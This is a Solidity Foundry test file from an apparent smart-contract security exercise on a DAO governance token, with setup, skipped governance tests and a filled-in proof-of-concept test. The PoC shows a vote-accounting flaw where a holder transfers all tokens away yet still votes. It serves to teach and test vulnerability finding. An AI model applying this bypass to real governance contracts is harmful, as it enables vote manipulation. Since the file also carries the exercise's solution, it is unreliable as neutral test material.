// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/dao-attack-1/RainbowAllianceToken.sol";

/**
 * @dev run "forge test -vvv --match-contract DAO1"
 */
contract TestDAO1 is Test {
    uint256 constant DEPLOYER_MINT = 1000 ether;
    uint256 constant USERS_MINT = 100 ether;
    uint256 constant USER2_BURN = 30 ether;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    RainbowAllianceToken rainbowAlliance;

    function setUp() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        vm.startPrank(deployer);

        // Deploy contract
        rainbowAlliance = new RainbowAllianceToken();

        // Mint for deployer tokens
        rainbowAlliance.mint(deployer, DEPLOYER_MINT);

        // Mint tokens to user1 and user2
        rainbowAlliance.mint(user1, USERS_MINT);
        rainbowAlliance.mint(user2, USERS_MINT);

        // Burn tokens from user2
        rainbowAlliance.burn(user2, USER2_BURN);
    }

    function testGovernance() public {
        vm.skip(true);

        /**
         * TESTS - DON'T CHANGE ANYTHING HERE
         */

        // Can't create proposals, if there is no voting power
        vm.startPrank(user3);
        vm.expectRevert("no voting rights");
        rainbowAlliance.createProposal("Donate 1000$ to charities");

        // Should be able to create proposals if you have voting power
        vm.startPrank(deployer);
        // Should not revert
        rainbowAlliance.createProposal("Pay 100$ to george for a new Logo");

        // Can't vote twice
        vm.expectRevert("already voted");
        rainbowAlliance.vote(1, true);

        // // Shouldn't be able to vote without voting rights
        vm.startPrank(user3);
        vm.expectRevert("no voting rights");
        rainbowAlliance.vote(1, true);

        // // Non existing proposal, reverts
        vm.startPrank(deployer);
        vm.expectRevert("proposal doesn't exist");
        rainbowAlliance.vote(123, true);

        // // Users votes
        vm.startPrank(user1);
        rainbowAlliance.vote(1, true);
        vm.startPrank(user2);
        rainbowAlliance.vote(1, false);

        // Check accounting is correct
        (uint256 id, string memory description, uint256 yes, uint256 no) = rainbowAlliance.getProposal(1);
        console.log("Proposal: %d", id);
        console.log("Description: %s", description);
        console.log("Yes: %d", yes);
        console.log("No:  %d", no);
        // Supposed to be 1,100 (User1 - 100, deployer - 1,000)
        assertEq(yes, DEPLOYER_MINT + USERS_MINT);
        // Supposed to be 70 (100 - 30, becuase we burned 30 tokens of user2)
        assertEq(no, USERS_MINT - USER2_BURN);
    }

    function testFailPoCCatchingTheBug() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        // TODO: Complete the test that catches the bug
        vm.startPrank(deployer);
        rainbowAlliance.createProposal("Test 1");
        vm.stopPrank();

        vm.startPrank(user1);
        // even though we transfer tokens we sill can vote
        rainbowAlliance.transfer(attacker, rainbowAlliance.balanceOf(user1));
        rainbowAlliance.vote(1, false);

        // attacker has tokens but can't vote
        vm.startPrank(attacker);
        rainbowAlliance.vote(1, false);

        (uint256 id, string memory description, uint256 yes, uint256 no) = rainbowAlliance.getProposal(1);
        console.log("Proposal: %d", id);
        console.log("Description: %s", description);
        console.log("Yes: %d", yes);
        console.log("No:  %d", no);
    }
}
